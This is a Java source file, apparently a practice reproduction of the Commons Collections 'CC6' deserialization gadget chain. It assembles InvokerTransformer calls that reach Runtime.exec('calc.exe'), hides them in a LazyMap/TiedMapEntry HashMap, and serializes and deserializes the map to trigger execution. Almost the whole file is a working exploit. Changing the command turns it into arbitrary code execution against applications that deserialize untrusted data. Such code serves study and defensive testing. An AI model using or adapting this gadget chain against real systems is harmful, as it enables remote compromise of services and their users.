package com.govuln.mytest;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class cc6_my {

    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Transformer[] transformers = new Transformer[]{new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc.exe"}),};
        Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        Map map = new HashMap<>();
        Map decorate = LazyMap.decorate(map, transformerChain);
        //decorate.get <-- tiedMapEntry.getValue <--tiedMapEntry.hashCode
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,"key");
        //tiedMapEntry.hashCode <--hashMap.hash(key) <-- hashMap.readObject()
        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry,"value");

        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(transformerChain,transformers);
        decorate.remove("key");


        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashMap);
        objectOutputStream.close();

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream objectInputStream  = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();



    }
}
